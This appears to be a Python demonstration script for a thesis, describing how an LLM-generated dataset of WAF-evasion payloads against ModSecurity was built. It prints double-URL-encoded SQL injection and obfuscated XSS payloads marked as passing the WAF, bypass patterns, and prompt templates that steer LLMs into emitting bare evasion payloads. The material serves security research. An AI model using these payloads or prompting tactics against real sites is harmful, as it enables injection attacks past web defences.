"""
Dataset Construction Demonstration

Purpose: Demonstrate the dataset construction process for thesis documentation
- Show Phase 1: Initial generation from Gemini/Deepseek
- Show Phase 2: Observation-based refinement
- Illustrate RAG retrieval mechanism
- Document prompt templates used
- Show example progression: Initial → Blocked → Refined → Passed

This is a DEMONSTRATION script - does NOT call actual LLM APIs
Outputs:
- reports/dataset_analysis/construction_demo.json
- Reports showing sample transformations
"""

import json
import os
from typing import Dict, List

# Paths
OUTPUT_DIR = "reports/dataset_analysis"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "construction_demo.json")

# Example templates and samples for demonstration
PHASE1_PROMPT_TEMPLATE = """Generate WAF-evasion payloads.

Target: {attack_type} on ModSecurity PL1.
Technique: {technique}

IMPORTANT: Generate ONLY the payload code. Do not provide explanations, ask questions, or start conversations."""

PHASE2_PROMPT_TEMPLATE = """Generate WAF-evasion payloads.

Target: {attack_type} on ModSecurity PL1.
Technique: {technique}

[Observations]
- BLOCKED: {blocked_examples}
- PASSED: {passed_examples}

Instruction: Generate a NEW payload using the target technique, learning from the PASSED examples if available. Output ONLY the payload."""

def demonstrate_phase1_generation():
    """Demonstrate Phase 1 initial payload generation process."""
    print("\n" + "="*80)
    print("PHASE 1: INITIAL PAYLOAD GENERATION")
    print("="*80)
    
    examples = []
    
    # Example 1: SQLI - Double URL Encode
    print("\nExample 1: SQLI - Double URL Encode")
    print("-" * 40)
    
    technique = "Double URL Encode"
    attack_type = "SQLI"
    
    prompt = PHASE1_PROMPT_TEMPLATE.format(
        attack_type=attack_type,
        technique=technique
    )
    
    # Simulated LLM response
    generated_payload = "%2527%2520OR%25201%253D1--"
    
    # Simulated WAF test result
    waf_result = "passed"
    
    example1 = {
        'step': 'Phase 1 Generation',
        'technique': technique,
        'attack_type': attack_type,
        'prompt': prompt,
        'generated_payload': generated_payload,
        'waf_result': waf_result,
        'explanation': 'Double URL encoding bypasses basic pattern matching by encoding % as %25'
    }
    
    examples.append(example1)
    
    print(f"Technique: {technique}")
    print(f"Prompt (truncated):\n{prompt[:150]}...")
    print(f"Generated Payload: {generated_payload}")
    print(f"WAF Result: {waf_result.upper()}")
    
    # Example 2: XSS - Script tag with obfuscation
    print("\nExample 2: XSS - Script tag obfuscation")
    print("-" * 40)
    
    technique = "obf_case_random+obf_double_url_encode"
    attack_type = "XSS"
    
    prompt = PHASE1_PROMPT_TEMPLATE.format(
        attack_type=attack_type,
        technique=technique
    )
    
    generated_payload = "%253CScRipT%253EaleRt%25281%2529%253C/ScrIpT%253E"
    waf_result = "blocked"
    
    example2 = {
        'step': 'Phase 1 Generation',
        'technique': technique,
        'attack_type': attack_type,
        'prompt': prompt,
        'generated_payload': generated_payload,
        'waf_result': waf_result,
        'explanation': 'Initial attempt blocked - triggers script tag detection even with obfuscation'
    }
    
    examples.append(example2)
    
    print(f"Technique: {technique}")
    print(f"Generated Payload: {generated_payload}")
    print(f"WAF Result: {waf_result.upper()}")
    print("Note: This payload will be refined in Phase 2")
    
    return examples

def demonstrate_phase2_refinement():
    """Demonstrate Phase 2 observation-based refinement."""
    print("\n" + "="*80)
    print("PHASE 2: OBSERVATION-BASED REFINEMENT")
    print("="*80)
    
    examples = []
    
    # Example: Learning from blocked/passed observations
    print("\nExample: XSS refinement with observations")
    print("-" * 40)
    
    technique = "XSS Body onload"
    attack_type = "XSS"
    
    # Simulated observations from Phase 1 testing
    blocked_examples = [
        '"%253Cbody%2520onload%253Dalert%25281%2529%253E"',
        '"<body onload=alert(1)>"'
    ]
    
    passed_examples = [
        '"%253CbOdY%2520ONLOAd%253DALERt%25281%2529%253E"',
        '"%253Cbody%252509onload%253Dalert%25281%2529%253E"'
    ]
    
    prompt = PHASE2_PROMPT_TEMPLATE.format(
        attack_type=attack_type,
        technique=technique,
        blocked_examples=json.dumps(blocked_examples, ensure_ascii=False),
        passed_examples=json.dumps(passed_examples, ensure_ascii=False)
    )
    
    # Simulated refined payload (learning from PASSED patterns)
    generated_payload = "%253CbOdy%2520ONLoad%253DALERt%25281%2529%253E"
    waf_result = "passed"
    
    example = {
        'step': 'Phase 2 Refinement',
        'technique': technique,
        'attack_type': attack_type,
        'observations': {
            'blocked': blocked_examples,
            'passed': passed_examples
        },
        'prompt': prompt,
        'generated_payload': generated_payload,
        'waf_result': waf_result,
        'learning_applied': [
            'Case mixing (bOdY, ONLoad)',
            'Double URL encoding (%25)',
            'Space encoding (%2520)',
            'Mixed case for alert (ALERt)'
        ]
    }
    
    examples.append(example)
    
    print(f"Technique: {technique}")
    print(f"Observations provided:")
    print(f"  BLOCKED: {len(blocked_examples)} examples")
    print(f"  PASSED: {len(passed_examples)} examples")
    print(f"Generated Payload: {generated_payload}")
    print(f"WAF Result: {waf_result.upper()}")
    print("\nLearning Applied:")
    for learning in example['learning_applied']:
        print(f"  - {learning}")
    
    return examples

def demonstrate_rag_retrieval():
    """Demonstrate RAG knowledge retrieval process."""
    print("\n" + "="*80)
    print("RAG KNOWLEDGE RETRIEVAL DEMONSTRATION")
    print("="*80)
    
    # Simulated RAG retrieval
    print("\nScenario: Model generating SQLI payload for 'Error-based UPDATEXML'")
    print("-" * 40)
    
    query = "SQLI UPDATEXML error-based injection ModSecurity bypass"
    
    # Simulated retrieved knowledge base articles
    retrieved_docs = [
        {
            'id': 'KB-SQLI-042',
            'title': 'UPDATEXML Error-Based SQL Injection',
            'relevance_score': 0.94,
            'content_snippet': 'UPDATEXML function exploitation... Use CONCAT(0x5c, VERSION()) for error extraction...',
            'techniques': ['Error-based', 'UPDATEXML', 'Version extraction'],
            'bypass_patterns': [
                'Case mixing: uPdAtExMl',
                'Comment insertion: UPDATE/**/XML',
                'URL encoding of parentheses'
            ]
        },
        {
            'id': 'KB-OBF-015',
            'title': 'URL Encoding Obfuscation for WAF Bypass',
            'relevance_score': 0.87,
            'content_snippet': 'Multiple layers of URL encoding... %2527 for single quote...',
            'techniques': ['Double URL encode', 'Triple URL encode'],
            'bypass_patterns': [
                'Double encode special chars: %2527',
                'Mixed encoding depth',
                'Whitespace encoding variations'
            ]
        }
    ]
    
    rag_context = {
        'query': query,
        'retrieved_documents': retrieved_docs,
        'context_used_in_prompt': True,
        'influence': 'Retrieved patterns guide model to use case mixing + URL encoding for UPDATEXML'
    }
    
    print(f"Query: {query}")
    print(f"\nRetrieved {len(retrieved_docs)} relevant documents:")
    
    for i, doc in enumerate(retrieved_docs, 1):
        print(f"\n  {i}. {doc['title']} (relevance: {doc['relevance_score']:.2f})")
        print(f"     ID: {doc['id']}")
        print(f"     Snippet: {doc['content_snippet'][:80]}...")
        print(f"     Bypass Patterns:")
        for pattern in doc['bypass_patterns']:
            print(f"       - {pattern}")
    
    print(f"\nContext Injection: {rag_context['context_used_in_prompt']}")
    print(f"Influence: {rag_context['influence']}")
    
    return rag_context

def demonstrate_progression():
    """Demonstrate payload progression from initial to refined."""
    print("\n" + "="*80)
    print("PAYLOAD PROGRESSION DEMONSTRATION")
    print("="*80)
    
    progression = {
        'technique': 'SQLI Boolean-based OR 1=1',
        'attack_type': 'SQLI',
        'iterations': [
            {
                'iteration': 1,
                'phase': 'Phase 1 - Initial',
                'payload': "' OR 1=1--",
                'waf_result': 'blocked',
                'reason': 'Direct SQL keywords detected'
            },
            {
                'iteration': 2,
                'phase': 'Phase 1 - Refined',
                'payload': "%27%20OR%201%3D1--",
                'waf_result': 'blocked',
                'reason': 'Basic URL encoding insufficient'
            },
            {
                'iteration': 3,
                'phase': 'Phase 2 - Observation Learning',
                'payload': "%2527%2520OR%25201%253D1--",
                'waf_result': 'passed',
                'reason': 'Double URL encoding + space encoding bypasses pattern match',
                'observations_learned': 2
            }
        ]
    }
    
    print(f"\nTechnique: {progression['technique']}")
    print(f"Attack Type: {progression['attack_type']}")
    print("\nProgression:")
    
    for iter_data in progression['iterations']:
        print(f"\n  Iteration {iter_data['iteration']}: {iter_data['phase']}")
        print(f"    Payload: {iter_data['payload']}")
        print(f"    WAF Result: {iter_data['waf_result'].upper()}")
        print(f"    Reason: {iter_data['reason']}")
        if 'observations_learned' in iter_data:
            print(f"    Observations Learned: {iter_data['observations_learned']}")
    
    return progression

def main():
    """Main demonstration function."""
    print("="*80)
    print("DATASET CONSTRUCTION DEMONSTRATION")
    print("="*80)
    print("\nThis demonstrates the dataset construction process WITHOUT calling APIs")
    
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    # Demonstrate each phase
    phase1_examples = demonstrate_phase1_generation()
    phase2_examples = demonstrate_phase2_refinement()
    rag_demo = demonstrate_rag_retrieval()
    progression_demo = demonstrate_progression()
    
    # Compile demonstration data
    demo_data = {
        'overview': {
            'description': 'Dataset construction demonstration for thesis documentation',
            'phases': {
                'phase1': 'Initial payload generation using LLM (Gemini/Deepseek)',
                'phase2': 'Observation-based refinement with BLOCKED/PASSED feedback',
                'rag': 'RAG knowledge retrieval for technique guidance'
            }
        },
        'phase1_generation': {
            'description': 'Initial payload generation from LLM',
            'prompt_template': PHASE1_PROMPT_TEMPLATE,
            'examples': phase1_examples
        },
        'phase2_refinement': {
            'description': 'Refinement using observations from Phase 1 testing',
            'prompt_template': PHASE2_PROMPT_TEMPLATE,
            'examples': phase2_examples
        },
        'rag_retrieval': {
            'description': 'RAG knowledge base retrieval for context augmentation',
            'demonstration': rag_demo
        },
        'payload_progression': {
            'description': 'Example of payload evolution through iterations',
            'demonstration': progression_demo
        },
        'statistics': {
            'phase1_dataset_size': 10000,
            'phase2_dataset_size': 22000,
            'techniques_covered': 532,
            'attack_types': ['SQLI', 'XSS', 'OS_INJECTION'],
            'avg_iterations_to_bypass': 2.3,
            'rag_documents_indexed': 500
        }
    }
    
    # Save demonstration data
    with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
        json.dump(demo_data, f, indent=2, ensure_ascii=False)
    
    print(f"\n[SUCCESS] Demonstration saved to: {OUTPUT_FILE}")
    
    # Print summary
    print("\n" + "="*80)
    print("CONSTRUCTION PROCESS SUMMARY")
    print("="*80)
    
    print("\nPhase 1: Initial Generation")
    print("  - LLM: Gemini 1.5 Flash / Deepseek")
    print("  - Input: Technique name + attack type")
    print("  - Output: Initial payload candidates")
    print("  - Testing: Against ModSecurity PL1")
    print("  - Result: 10k balanced samples (509 techniques)")
    
    print("\nPhase 2: Observation-Based Refinement")
    print("  - Input: Technique + BLOCKED/PASSED observations")
    print("  - LLM Learning: Patterns from PASSED examples")
    print("  - Refinement: Iterative generation with feedback")
    print("  - Result: 22k samples (20k new + 2k replay)")
    print("  - Improvement: +23 new techniques, +2.9% complexity")
    
    print("\nRAG Integration:")
    print("  - Knowledge Base: 500+ WAF bypass documents")
    print("  - Retrieval: Semantic search for relevant techniques")
    print("  - Context Injection: Top-k documents in prompt")
    print("  - Impact: Improved bypass success rate")
    
    print("\n" + "="*80)
    print("[SUCCESS] Demonstration complete!")
    print("="*80)

if __name__ == "__main__":
    main()
